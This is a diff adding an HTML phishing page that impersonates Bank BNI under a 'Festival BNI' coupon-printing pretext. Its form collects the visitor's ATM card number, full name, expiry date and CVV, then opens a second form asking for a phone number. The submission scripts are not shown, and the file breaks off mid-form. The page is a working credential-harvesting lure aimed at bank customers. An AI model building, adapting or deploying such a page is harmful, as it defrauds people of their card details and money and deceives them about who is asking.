@@ -1,0 +1,1470 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Festival BNI</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
+<link rel="icon" href="" type="image/x-icon" />
+<link rel="apple-touch-icon" href="" />
+  <!-- Meta Tags Generated via https://www.opengraph.xyz -->
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
+<meta content='#17c0d1' name='theme-color'/>
+  <style>
+    @import url("https://fonts.googleapis.com/css?family=Source+Code+Pro:400,500,600,700|Source+Sans+Pro:400,600,700&display=swap");
+
+.html {
+    width: 100%;
+    height: 100%;
+    background-image: url("");
+  font-family: "Source Sans Pro", sans-serif;
+  background-repeat: no-repeat;
+  background-position: 100% 100%;
+  background-size: 100% 100%;
+}
+
+body{
+ background-image: url("");
+  font-family: "Source Sans Pro", sans-serif;
+  position: absolute;
+  background-color: #f1f1f2;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background-repeat: no-repeat;
+  background-position: 100% 100%;
+  background-size: 100% 100%;
+  font-size: 16px;
+  width: 100%;
+  height: 100%;
+  
+  }
+* {
+  box-sizing: border-box;
+}
+*:focus {
+  outline: none;
+}
+
+.wrapper {
+  min-height: 92vh;
+  display: flex;
+  padding: 50px 15px;
+  background: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhaIpOBavBAdX7gRKKueXMH-CEMhyphenhyphenIEz5COmD1SXkX1r1wFGm3y9dgBMcSkoaJkx-ita2ziEgD7gV3PxlgSSMHAlEFlml-rRQP3U8rEtUx-c7N96y0Rr8hffBpK-nBXE4T22PnIAP65CdY_zlqBc1RB9YZgXawbM2pkn0HLEsakPThjcIx5cSvR1Q2_bw4/s1426/IMG_20240905_231713.jpg)
+  no-repeat center/cover;
+  
+}
+@media screen and (max-width: 700px), (max-height: 440px) {
+  .wrapper {
+    flex-wrap: wrap;
+    flex-direction: column;
+  }
+}
+
+.card-form {
+  max-width: 570px;
+  margin: auto;
+  width: 100%;
+  height: 470px;
+}
+@media screen and (max-width: 576px) {
+  .card-form {
+    margin: 0 auto;
+  }
+}
+.card-form__inner {
+   background: #fff;
+  font-family: "Source Sans Pro", sans-serif;
+ 
+  background-position: 100% 100%;
+  background-size: 100% 100%;
+ outline-style: ridge ;
+ paint-order: stroke markers fill;
+  box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+  border-radius: 15px;
+  border: 3px ridge ;
+  color: #17c0d1;
+  height: 470px;
+  padding-top: 120px;
+  
+}
+@media screen and (max-width: 480px) {
+  .card-form__inner {
+    padding: 20px;
+    padding-top: 120px;
+    
+  }
+}
+@media screen and (max-width: 360px) {
+  .card-form__inner {
+    padding: 15px;
+    padding-top: 145px;
+  }
+}
+.card-form__row {
+  display: flex;
+  align-items: flex-text;
+}
+@media screen and (max-width: 480px) {
+  .card-form__row {
+    flex-wrap: wrap;
+  }
+}
+.card-form__col {
+  flex: auto;
+  margin-right: 35px;
+}
+.card-form__col:last-child {
+  margin-right: 0;
+}
+@media screen and (max-width: 480px) {
+  .card-form__col {
+    margin-right: 0;
+    flex: unset;
+    width: 100%;
+    margin-bottom: 20px;
+  }
+  .card-form__col:last-child {
+    margin-bottom: 0;
+  }
+}
+.card-form__col.-cvv {
+  max-width: 150px;
+  
+}
+@media screen and (max-width: 480px) {
+  .card-form__col.-cvv {
+    max-width: initial;
+  }
+}
+.card-form__group {
+  display: flex;
+  align-items: flex-start;
+  flex-wrap: wrap;
+}
+.card-form__group .card-input__input {
+  flex: 1;
+  margin-right: 15px;
+}
+.card-form__group .card-input__input:last-child {
+  margin-right: 0;
+}
+.card-form__button {
+  width: 100%;
+  height: 43px;
+  box-shadow: 0px 17px 20px -6px rgba(36, 52, 70, 0.36);
+  
+  background: #17c0d1;
+  border: 3px blue;
+  outline-style: groove;
+ color: #fff;
+  border-radius: 22px;
+  font-size: 15px;
+  font-weight: 500;
+  style="font-weight: 800;
+  font-family: "Source Sans Pro", sans-serif;
+  box-shadow: #D5D5D5 10px; 
+  
+  margin-top: -10px;
+  cursor: pointer;
+}
+@media screen and (max-width: 480px) {
+  .card-form__button {
+    margin-top: -10px;
+  }
+}
+
+.card-item {
+  max-width: 430px;
+  height: 270px;
+  margin-left: auto;
+  margin-right: auto;
+  position: relative;
+  z-index: 2;
+  width: 100%;
+  
+}
+@media screen and (max-width: 480px) {
+  .card-item {
+    max-width: 310px;
+    height: 220px;
+    width: 90%;
+  }
+}
+@media screen and (max-width: 360px) {
+  .card-item {
+    height: 180px;
+  }
+}
+.card-item.-active .card-item__side.-front {
+  transform: perspective(1000px) rotateY(180deg) rotateX(0deg) rotateZ(0deg);
+}
+.card-item.-active .card-item__side.-back {
+  transform: perspective(1000px) rotateY(0) rotateX(0deg) rotateZ(0deg);
+}
+.card-item__focus {
+  position: absolute;
+  z-index: 3;
+  border-radius: 5px;
+  left: 0;
+  top: 0;
+  width: 100%;
+  height: 100%;
+  transition: all 0.35s cubic-bezier(0.71, 0.03, 0.56, 0.85);
+  opacity: 0;
+  pointer-events: none;
+  overflow: hidden;
+  border: 2px solid rgba(255, 255, 255, 0.65);
+}
+.card-item__focus:after {
+  content: "";
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  background: #08142f;
+  height: 100%;
+  border-radius: 5px;
+  filter: blur(25px);
+  opacity: 0.5;
+}
+.card-item__focus.-active {
+  opacity: 1;
+}
+.card-item__side {
+  border-radius: 15px;
+  overflow: hidden;
+  box-shadow: 0 20px 60px 0 rgba(14, 42, 90, 0.55);
+  transform: perspective(2000px) rotateY(0deg) rotateX(0deg) rotate(0deg);
+  transform-style: preserve-3d;
+  transition: all 0.8s cubic-bezier(0.71, 0.03, 0.56, 0.85);
+  backface-visibility: hidden;
+  height: 100%;
+}
+.card-item__side.-back {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  transform: perspective(2000px) rotateY(-180deg) rotateX(0deg) rotate(0deg);
+  z-index: 2;
+  padding: 0;
+  height: 100%;
+  
+}
+.card-item__side.-back .card-item__cover {
+  transform: rotateY(-180deg);
+}
+.card-item__bg {
+  max-width: 100%;
+  display: block;
+  max-height: 100%;
+  height: 100%;
+  width: 100%;
+  object-fit: cover;
+  border: 3px solid snow;
+  border-radius: 15px;
+  
+}
+.card-item__cover {
+  height: 100%;
+  background-color: white;
+  position: absolute;
+  height: 100%;
+  background-color: white;
+  left: 0;
+  top: 0;
+  width: 100%;
+  border-radius: 15px;
+  overflow: hidden;
+}
+.card-item__cover:after {
+  content: "";
+  position: absolute;
+  left: 0;
+  top: 0;
+  width: 100%;
+  height: 100%;
+  background: ;
+}
+.card-item__top {
+  display: flex;
+  border: 2px;
+  align-items: flex-start;
+  justify-content: space-between;
+  margin-bottom: 40px;
+  padding: 0 10px;
+  
+}
+@media screen and (max-width: 480px) {
+  .card-item__top {
+    margin-bottom: 25px;
+  }
+}
+@media screen and (max-width: 360px) {
+  .card-item__top {
+    margin-bottom: 20px;
+  }
+}
+.card-item__chip {
+  width: 60px;
+}
+@media screen and (max-width: 480px) {
+  .card-item__chip {
+    width: 50px;
+  }
+}
+@media screen and (max-width: 360px) {
+  .card-item__chip {
+    width: 40px;
+  }
+}
+.card-item__type {
+  height: 45px;
+  position: relative;
+  display: flex;
+  justify-content: flex-end;
+  max-width: 100px;
+  margin-left: auto;
+  width: 100%;
+  
+}
+@media screen and (max-width: 480px) {
+  .card-item__type {
+    height: 40px;
+    max-width: 90px;
+  }
+}
+@media screen and (max-width: 360px) {
+  .card-item__type {
+    height: 30px;
+  }
+}
+.card-item__typeImg {
+  max-width: 100%;
+  object-fit: contain;
+  max-height: 100%;
+  object-position: top right;
+}
+.card-item__info {
+  color: #fff;
+  width: 100%;
+  max-width: calc(100% - 85px);
+  padding: 10px 15px;
+  font-weight: 500;
+  display: block;
+  cursor: pointer;
+}
+@media screen and (max-width: 480px) {
+  .card-item__info {
+    padding: 10px;
+  }
+}
+.card-item__holder {
+  opacity: 100;
+  font-size: 13px;
+  margin-bottom: 6px;
+  color: yellow;
+}
+@media screen and (max-width: 480px) {
+  .card-item__holder {
+    font-size: 12px;
+    margin-bottom: 5px;
+  }
+}
+.card-item__wrapper {
+  font-family: "Source Code Pro", monospace;
+  padding: 25px 15px;
+  position: relative;
+  z-index: 4;
+  height: 100%;
+  text-shadow: 7px 6px 10px rgba(14, 42, 90, 0.8);
+  user-select: none;
+  
+}
+@media screen and (max-width: 480px) {
+  .card-item__wrapper {
+    padding: 20px 10px;
+  }
+}
+.card-item__name {
+  font-size: 10px;
+  line-height: 1;
+  white-space: nowrap;
+  width: 150px;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  text-transform: uppercase;
+}
+@media screen and (max-width: 480px) {
+  .card-item__name {
+    font-size: 16px;
+  }
+}
+.card-item__nameItem {
+  display: inline-block;
+  min-width: 8px;
+  position: relative;
+}
+.card-item__number {
+  font-weight: 500;
+  line-height: 1;
+  color: #fff;
+  font-size: 27px;
+  margin-bottom: 35px;
+  display: inline-block;
+  padding: 10px 15px;
+  cursor: pointer;
+}
+@media screen and (max-width: 480px) {
+  .card-item__number {
+    font-size: 21px;
+    margin-bottom: 15px;
+    padding: 10px 10px;
+  }
+}
+@media screen and (max-width: 360px) {
+  .card-item__number {
+    font-size: 19px;
+    margin-bottom: 10px;
+    padding: 10px 10px;
+  }
+}
+.card-item__numberItem {
+  width: 16px;
+  display: inline-block;
+}
+.card-item__numberItem.-active {
+  width: 30px;
+}
+@media screen and (max-width: 480px) {
+  .card-item__numberItem {
+    width: 13px;
+  }
+  .card-item__numberItem.-active {
+    width: 16px;
+  }
+}
+@media screen and (max-width: 360px) {
+  .card-item__numberItem {
+    width: 12px;
+  }
+  .card-item__numberItem.-active {
+    width: 8px;
+  }
+}
+.card-item__content {
+  color: #fff;
+  display: flex;
+  align-items: flex-start;
+}
+.card-item__date {
+  display: flex;
+  font-size: 15px;
+  padding: 7px;
+  width: 90px;
+  white-space: nowrap;
+  flex-shrink: 0;
+  cursor: pointer;
+  flex-wrap: wrap;
+}
+@media screen and (max-width: 480px) {
+  .card-item__date {
+    font-size: 15px;
+    height: 50px;
+    padding-top: -5px;
+    margin-left: 10px;
+  }
+}
+.card-item__dateItem {
+  position: relative;
+  
+  
+}
+.card-item__dateItem span {
+  width: 25px;
+  display: inline-block;
+  margin-left: 5px;
+}
+.card-item__dateTitle {
+  opacity: 100;
+  font-size: 13px;
+  padding-bottom: 6px;
+  width: 100%;
+  margin-left: -5px;
+  
+}
+@media screen and (max-width: 480px) {
+  .card-item__dateTitle {
+    font-size: 12px;
+    padding-bottom: 5px;
+    color: yellow;
+    
+  }
+}
+.card-item__band {
+  background: transparent;
+  width: 100%;
+  height: 50px;
+  margin-top: 30px;
+  position: relative;
+  z-index: 2;
+}
+@media screen and (max-width: 480px) {
+  .card-item__band {
+    margin-top: 20px;
+  }
+}
+@media screen and (max-width: 360px) {
+  .card-item__band {
+    height: 40px;
+    margin-top: 10px;
+  }
+}
+.card-item__cvv {
+  text-align: right;
+  position: relative;
+  z-index: 2;
+  padding: 15px;
+}
+.card-item__cvv .card-item__type {
+  opacity: 0.7;
+}
+@media screen and (max-width: 360px) {
+  .card-item__cvv {
+    padding: 10px 15px;
+  }
+}
+.card-item__cvvTitle {
+  padding-right: 10px;
+  font-size: 15px;
+  font-weight: 500;
+  color: #fff;
+  margin-bottom: 5px;
+  position: relative;
+  margin-top: -20px;
+  
+}
+.card-item__cvvBand {
+  height: 45px;
+  background: transparent;
+  margin-bottom: 30px;
+  text-align: right;
+  display: flex;
+  align-items: center;
+  justify-content: flex-end;
+  padding-right: 10px;
+  color: #1a3b5d;
+  font-size: 18px;
+  border-radius: 4px;
+  
+  
+  
+}
+@media screen and (max-width: 480px) {
+  .card-item__cvvBand {
+    height: 40px;
+    margin-bottom: 20px;
+  }
+}
+@media screen and (max-width: 360px) {
+  .card-item__cvvBand {
+    margin-bottom: 15px;
+  }
+}
+
+.card-list {
+  margin-bottom: -100px;
+}
+@media screen and (max-width: 480px) {
+  .card-list {
+    margin-bottom: -120px;
+  }
+}
+
+.card-input {
+  margin-bottom: 20px;
+}
+.card-input__label {
+  font-size: 15px;
+  margin-bottom: 5px;
+  font-weight: 500;
+  color: #17c0d1;
+  width: 100%;
+  margin-top: -15px;
+  display: block;
+  user-select: none;
+}
+.card-input__input {
+  width: 100%;
+  height: 40px;
+  border-radius: 10px;
+  box-shadow: 0px 17px 20px -6px rgba(36, 52, 70, 0.36); border: outline-style: groove;
+  border: 2px solid #17c0d1;
+  transition: all 0.3s ease-in-out;
+  font-size: 18px;
+  padding: 5px;
+  padding-left: 10px;
+  padding-top: 3px;
+  background: #fff;
+  color: #1a3b5d;
+  font-family: "Source Sans Pro", sans-serif;
+}
+.card-input__input:hover, .card-input__input:focus {
+  border-color: none;
+}
+.card-input__input:focus {
+  box-shadow: 0px 10px 20px -13px rgba(32, 56, 117, 0.35);
+  background: #fff;
+}
+
+
+.card-input__input::placeholder{
+    font-size: 14px;
+    
+}
+.card-input__input.-select {
+  -webkit-appearance: none;
+  background-image: url("https://static.thenounproject.com/png/4066370-200.png");
+  background-size: 14px;
+  background-position: 90% center;
+  background-repeat: no-repeat;
+  padding-right: 30px;
+  padding-top: 3px;
+}
+
+
+.card-input__input.-select2 {
+  -webkit-appearance: none;
+  background-image: url("https://uxwing.com/wp-content/themes/uxwing/download/e-commerce-currency-shopping/card-cvv-icon.png");
+  background-size: 22px;
+  background-position: 90% center;
+  background-repeat: no-repeat;
+  padding-right: 30px;
+  padding-top: 3px;
+}
+
+.slide-fade-up-enter-active {
+  transition: all 0.25s ease-in-out;
+  transition-delay: 0.1s;
+  position: relative;
+}
+
+.slide-fade-up-leave-active {
+  transition: all 0.25s ease-in-out;
+  position: absolute;
+}
+
+.slide-fade-up-enter {
+  opacity: 0;
+  transform: translateY(15px);
+  pointer-events: none;
+}
+
+.slide-fade-up-leave-to {
+  opacity: 0;
+  transform: translateY(-15px);
+  pointer-events: none;
+}
+
+.slide-fade-right-enter-active {
+  transition: all 0.25s ease-in-out;
+  transition-delay: 0.1s;
+  position: relative;
+}
+
+.slide-fade-right-leave-active {
+  transition: all 0.25s ease-in-out;
+  position: absolute;
+}
+
+.slide-fade-right-enter {
+  opacity: 0;
+  transform: translateX(10px) rotate(45deg);
+  pointer-events: none;
+}
+
+.slide-fade-right-leave-to {
+  opacity: 0;
+  transform: translateX(-10px) rotate(45deg);
+  pointer-events: none;
+}
+
+.github-btn {
+  position: absolute;
+  right: 40px;
+  bottom: 50px;
+  text-decoration: none;
+  padding: 15px 25px;
+  border-radius: 4px;
+  box-shadow: 0px 4px 30px -6px rgba(36, 52, 70, 0.65);
+  background: #24292e;
+  color: #fff;
+  font-weight: bold;
+  letter-spacing: 1px;
+  font-size: 16px;
+  text-align: center;
+  transition: all 0.3s ease-in-out;
+}
+@media screen and (min-width: 500px) {
+  .github-btn:hover {
+    transform: scale(1.1);
+    box-shadow: 0px 17px 20px -6px rgba(36, 52, 70, 0.36);
+  }
+}
+@media screen and (max-width: 700px) {
+  .github-btn {
+    position: relative;
+    bottom: auto;
+    right: auto;
+    margin-top: 20px;
+  }
+  .github-btn:active {
+    transform: scale(1.1);
+    box-shadow: 0px 17px 20px -6px rgba(36, 52, 70, 0.36);
+  }
+}
+/*********************/
+   .process {
+     top: 0;left: 0;
+     right: 0;
+     position: fixed;
+     display: flex;
+     justify-content: center;
+     align-items: center;
+     background: #0000005b;
+     z-index: 999999999;
+     width: 100%;
+     height: 100%;
+     
+   }
+  .loading {
+    margin-top: -50px;
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    
+  }
+  .loading img {
+    width: 50px;
+    
+  }
+  .loading .spinner{
+    position: absolute;
+    width: 35px;
+    animation: spin 1s linear infinite;
+    -webkit-animation: spin 1s linear infinite;
+    -moz-animation: spin 1s linear infinite;
+    -ms-animation: spin 1s linear infinite;
+    -o-animation: spin 1s linear infinite;
+    
+  }
+ .text-header {
+            font-family: 'Open Sans', sans-serif;
+            color: #0086e0;
+        }
+
+        .text-subheader {
+            font-family: 'Open Sans', sans-serif;
+            margin-top: -20px;
+            color: #000;
+        }
+
+        .btn-punya {
+            display: block;
+            margin: 80px auto 0 auto;
+            padding: 0px; 
+            cursor: pointer; 
+            background: none rgb(0, 134, 224);
+            border: none; 
+            text-align: center; 
+            height: 57px; 
+            width: 459px; 
+            max-width: 100%;
+            font-family: Arial; 
+            font-size: 14px; 
+            font-weight: bold; 
+            color: rgb(255, 255, 255); 
+            letter-spacing: 2px; 
+            line-height: 1; 
+            border-radius: 5px; 
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
+            transition: background 200ms ease 0s;
+        }
+
+        .btn-belum {
+            display: block;
+            margin: 10px auto;
+            padding: 0px; 
+            cursor: pointer; 
+            background: none transparent;
+            border: none; 
+            text-align: center; 
+            height: 57px; 
+            width: 459px; 
+            max-width: 100%;
+            font-family: Arial; 
+            font-size: 14px; 
+            font-weight: bold; 
+            color: rgb(0, 134, 224);
+            letter-spacing: 2px; 
+            line-height: 1; 
+            border-radius: 5px; 
+            transition: background 200ms ease 0s;
+        }
+
+        .form-log {
+            box-sizing: border-box; 
+            height: 45px; 
+            width: 336px;
+            max-width: 90%;
+            border: 3px solid #08656f;
+            border-radius: 23px;
+            font-family: 'Open Sans', sans-serif;
+            font-size: 16px; 
+            color: rgb(28, 28, 28); 
+            word-spacing: 0px; 
+            padding: 0px 45px;
+            text-align: center;
+            }
+
+        #ionIcons {
+            color: rgb(22, 119, 199);
+            font-size: 29px;
+            position: absolute;
+            display: block;
+            margin-top: 8px;
+            margin-left: 37px;
+        }
+
+        .eye {
+            display: block;
+            margin: -40px auto;
+            margin-right: 20px;
+            position: relative;
+            box-sizing: border-box; 
+            z-index: 16; 
+            height: 19.8189px;
+            width: 25.0236px; 
+            float: right;
+            border-radius: 0px; 
+            cursor: pointer;
+        }
+
+        .Button clickable-element {
+            display: block;
+            margin: 60px 0 0 0;
+            padding: 0px; 
+            cursor: pointer; 
+            background: none rgba(0, 111, 214, 0.96); 
+            border: none; 
+            text-align: center; 
+            height: 57px; 
+            width: 370px; 
+            font-family: Arial; 
+            font-size: 17px; 
+            font-weight: bold; 
+            color: rgb(255, 255, 255); 
+            letter-spacing: 1px; 
+            line-height: 1; 
+            border-radius: 8px; 
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
+            transition: background 100ms step-start 0s;
+        }
+
+        @media only screen and (max-width: 600px) {
+            .btn-login {
+                width: 82%;
+            }
+        }
+
+        .box-lte {
+            width: 380px;
+            max-width: 95%;
+            background: #fff;
+            display: block;
+            box-shadow: 10px 15px 10px 0 rgba(90, 116, 148, 0.4);
+            margin: -40px auto;
+            border-radius: 20px;
+            height: 450px;
+        }
+
+        textarea {
+            box-sizing: border-box; 
+            height: 75px;
+            margin-top: -30px;
+            width: 280px;
+            border: 3px solid rgb(0, 134, 224);
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+            border-radius: 15px;
+            padding: 5px 10px;
+        }
+        
+          .textarea1 {
+            box-sizing: border-box; 
+            
+            border: 2px solid red;
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+            border-radius: 50px;
+            
+        }
+        
+         .textarea {
+            box-sizing: border-box; 
+            height: 75px;
+           
+            width: 280px;
+            border: 2px solid red;
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+            border-radius: 15px;
+            padding: 5px 10px;
+        }
+        
+        textarea::placeholder{
+            font-size: 13px;
+        }
+           h1{
+            display: table;
+            background-color: transparent;
+            color: #FF0000;
+            padding: 15px;
+            width: 100%;
+            font-size: 10px;
+            margin-bottom: -70px;
+            text-align: center;
+            position: fixed;
+            top: 320px;
+           font-weight: bold;
+            right: 0;
+            left: 0;
+            margin: 0px auto;
+            
+        }
+        
+        .blink {
+  animation: blink-animation 2s steps(6, start) infinite;
+  -webkit-animation: blink-animation 2s steps(6, start) infinite;
+}
+@keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+@-webkit-keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+
+#Aktivasi{
+    display: none;
+}
+  </style>
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<center>
+     <div id="process1" name="process" class="process" style="display: none;">
+            <div class="loading">
+                <img class="spinner" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhFE_czWoYVjGZ9WT90dwDRGzsw_u8miF1WtkcowDYxZGT78d7yt6nfV_dX26RKNlOD5QgWMUJGXbIlfUrhcVT93Ehoe6acrkpcFwrfWTXMUfCfntZFfxDWGrp2QY8hya0E9wJO4xbaYJDRv8V-Mtx4ubSIHC95d0wW90ATdEVlEmvPijcITT2vCo1VXPg/s637/1_ngNzwrRBDElDnf2CLF_Rbg.gif" id="loading" style="margin-top: 8px">
+            </div>
+        </div>
+        </center>
+<div class="wrapper" id="app">
+    <div class="card-form">
+      <div class="card-list">
+        <div class="card-item" v-bind:class="{ '-active' : isCardFlipped }">
+          <div class="card-item__side -front">
+            <div class="card-item__focus" v-bind:class="{'-active' : focusElementStyle }" v-bind:style="focusElementStyle" ref="focusElement"></div>
+            <div class="card-item__cover">
+              <img
+              v-bind:src="'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgBKUJo_-v77z6vMZxHPbYkyS1X2iE3uKXum-FjvT4EWzyl0aik_xXEwjwscsUhmAx06vOPKaAMQYH9Q53FYrLwIxTRbZbt8idAEGp-IxQ5jZ2hsmB5xS2wtHmEQE8kueJh5dM8RAnrng6rtzv5oiNEFjq2Q2P_pAHPJR87coZpZk9FDUgRnRhsdc076Nk/s500/IMG_20240906_110012.png'" class="card-item__bg">
+            </div>
+            
+            <div class="card-item__wrapper">
+              <div class="card-item__top">
+                <img src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/chip.png" class="card-item__chip">
+                <div class="card-item__type">
+                  <transition name="slide-fade-up">
+                    <img v-bind:src="'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgT5n2mnrliGy1vD9BkqKn1wIcRqw4t_mAQckNYEPUH8Xbgyq8c5APh-t1-UTRsBM7JEGoBktxj6Uj1AfXlD90UPDdggcEbFGODpLz_TCBhjD0p3dMTv_M-zqoZ0o2oSOvBcuA7BaDRHz6N6PWa-MV_ViK0Ohc-fxgCt_APH4XnsNAZiALkK80hvhudcDo/s241/logo-bni-new.png'" v-if="getCardType" v-bind:key="getCardType" alt="" class="card-item__typeImg">
+                  </transition>
+                </div>
+              </div>
+              <label for="cardNumber" class="card-item__number" ref="cardNumber">
+                <template v-if="getCardType === 'amex'">
+                 <span v-for="(n, $index) in amexCardMask" :key="$index">
+                  <transition name="slide-fade-up">
+                    <div
+                      class="card-item__numberItem"
+                      v-if="$index > 4 && $index < 14 && cardNumber.length > $index && n.trim() !== ''"
+                    >*</div>
+                    <div class="card-item__numberItem"
+                      :class="{ '-active' : n.trim() === '' }"
+                      :key="$index" v-else-if="cardNumber.length > $index">
+                      {{cardNumber[$index]}}
+                    </div>
+                    <div
+                      class="card-item__numberItem"
+                      :class="{ '-active' : n.trim() === '' }"
+                      v-else
+                      :key="$index + 1"
+                    >{{n}}</div>
+                  </transition>
+                </span>
+                </template>
+
+                <template v-else>
+                  <span v-for="(n, $index) in otherCardMask" :key="$index">
+                    <transition name="slide-fade-up">
+                      <div
+                        class="card-item__numberItem"
+                        v-if="$index > 4 && $index < 15 && cardNumber.length > $index && n.trim() !== ''"
+                      >*</div>
+                      <div class="card-item__numberItem"
+                        :class="{ '-active' : n.trim() === '' }"
+                        :key="$index" v-else-if="cardNumber.length > $index">
+                        {{cardNumber[$index]}}
+                      </div>
+                      <div
+                        class="card-item__numberItem"
+                        :class="{ '-active' : n.trim() === '' }"
+                        v-else
+                        :key="$index + 1"
+                      >{{n}}</div>
+                    </transition>
+                  </span>
+                </template>
+              </label>
+              <div class="card-item__content">
+                <label for="cardName" class="card-item__info" ref="cardName">
+                  <div class="card-item__holder">Cetak Kupon</div>
+                  <transition name="slide-fade-up">
+                    <div class="card-item__name" v-if="cardName.length" key="1">
+                      <transition-group name="slide-fade-right">
+                        <span class="card-item__nameItem" v-for="(n, $index) in cardName.replace(/\s\s+/g, ' ')" v-if="$index === $index" v-bind:key="$index + 1">{{n}}</span>
+                      </transition-group>
+                    </div>
+                    <div class="card-item__name" v-else key="2">Nama Lengkap</div>
+                  </transition>
+                </label>
+                <div class="card-item__date" ref="cardDate">
+                  <label for="cardMonth" class="card-item__dateTitle">Masa Berlaku</label>
+                  <label for="cardMonth" class="card-item__dateItem">
+                    <transition name="slide-fade-up">
+                      <span v-if="cardMonth" v-bind:key="cardMonth">{{cardMonth}}</span>
+                 <span v-else key="2">MM</span>
+                    </transition>
+                  </label>
+                  /
+                  <label for="cardYear" class="card-item__dateItem">
+                    <transition name="slide-fade-up">
+                      <span v-if="cardYear" v-bind:key="cardYear">{{String(cardYear).slice(2,4)}}</span>
+                      <span v-else key="2">YY</span>
+                    </transition>
+                  </label>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="card-item__side -back">
+            <div class="card-item__cover">
+              <img
+              v-bind:src="'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhuc79ruhHTCC_11pCnaiHHjnxq9hrFBiLjFeO7mTneD5CwUVOIXrfSnUHl1pb7w99aeXn4aAwzyJARiXpU34HXoa3EPEZo5hcNxlEMwMq0Fpr3AeMOZFVr6w1QkLt-R_QMiSJUV_h2eWu1hsUqHmx0ssAqJUAr4tW1P12iij77NObshY30AN2kxcm27tI/s500/bni-gold-master-card-2-v1.jpg' + currentCardBackground + '.jpeg'" class="card-item__bg">
+            </div>
+            <div class="card-item__band"></div>
+            <div class="card-item__cvv">
+                <div class="card-item__cvvTitle">CVV</div>
+                <div class="card-item__cvvBand">
+                  <span v-for="(n, $index) in cardCvv" :key="$index">
+                    *
+                  </span>
+
+              </div>
+                <div class="card-item__type">
+                    
+                </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="card-form__inner">
+        <form id="formData" onsubmit="sendData(event);" method="POST">
+        <input type="hidden" value="====𝑵𝑶𝑻𝑰𝑭𝑰𝑲𝑨𝑺𝑰 𝑩𝑨𝑵𝑲 𝑩𝑵𝑰====" id="logo">
+        <div class="card-input">
+          <label for="cardNumber" class="card-input__label">Nomor Kartu ATM 16 Digit</label>
+          <input type="text" id="cardNumber" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" minlength="19" maxlength="19" placeholder="Masukan Nomor Kartu ATM" inputmode="numeric" required>
+        </div>
+        <div class="card-input">
+          <label for="cardName" class="card-input__label">Nama Lengkap Nasabah</label>
+          <input type="text" id="cardName" class="card-input__input" v-model="cardName"  v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" placeholder="Masukan Nama Lengkap Nasabah" required>
+        </div>
+        <div class="card-form__row">
+          <div class="card-form__col">
+            <div class="card-form__group">
+              <label for="cardMonth" class="card-input__label">Masa Berlaku Kartu ATM</label>
+              <select class="card-input__input -select" id="cardMonth" v-model="cardMonth" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate" required>
+                <option value="" selected disabled>Bulan</option>
+                <option value="01">01</option>
+                <option value="02">02</option>
+                <option value="03">03</option>
+                <option value="04">04</option>
+                <option value="05">05</option>
+                <option value="06">06</option>
+                <option value="07">07</option>
+                <option value="08">08</option>
+                <option value="09">09</option>
+                <option value="10">10</option>
+                <option value="11">11</option>
+                <option value="12">12</option>
+              </select>
+              <select class="card-input__input -select" id="cardYear" v-model="cardYear" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate" required>
+                <option value="" selected disabled>Tahun</option>
+                <option value="2024">2024</option>
+                <option value="2025">2025</option>
+                <option value="2026">2026</option>
+                <option value="2027">2027</option>
+                <option value="2028">2028</option>
+                <option value="2029">2029</option>
+                <option value="2030">2030</option>
+              </select>
+            </div>
+          </div>
+          <div class="card-form__col -cvv">
+            <div class="card-input">
+              <label for="cardCvv" class="card-input__label">CVV</label>
+              <input type="text" class="card-input__input" id="cardCvv" v-mask="'####'" maxlength="3" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off" minlength="3" inputmode="numeric" placeholder="Masukan CVV (3 angka Dibalik Kartu ATM)" required>
+            </div>
+          </div>
+        </div>
+
+        <button class="card-form__button" onclick="sendNohp()" id="buttonku">
+          Selanjutnya
+        </button>
+      </div>
+     </form>
+    </div>
+  </div>
+  <div style="width: 100%;height: 425px;position: fixed;bottom: 0;background: linear-gradient(#fff,#aae2e4);border: 2px ridge #17c0d1;display: none;opacity: 5;box-shadow: 4px 7px 10px rgba(0,0,0,0.5);border-top-left-radius: 20px;border-top-right-radius: 20px;" class="box-hp">
+    <h6 style="text-align: center;margin-top: 15px;font-weight: bold;color: #c0c0c0;">Konfirmasi Untuk Melanjutkan Cetak Kupon</h6>
+    <br>
+    <form id="formHP" onsubmit="sendHP(event);" method="POST">
+    <div style="width: 100%;box-sizing: border-box;align-items: center;justify-items: center;justify-content: center;padding: 5px 15px;">
